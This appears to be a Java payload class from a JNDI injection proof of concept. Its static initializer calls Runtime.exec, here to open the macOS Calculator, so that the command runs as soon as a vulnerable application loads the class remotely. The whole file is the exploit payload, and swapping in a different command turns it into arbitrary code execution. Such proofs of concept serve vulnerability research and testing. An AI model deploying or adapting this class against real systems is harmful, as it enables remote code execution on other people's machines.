package com.jndi;

public class badClassName {
    static{
        try{
            Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
        }catch(Exception e){
            ;
        }
    }
}
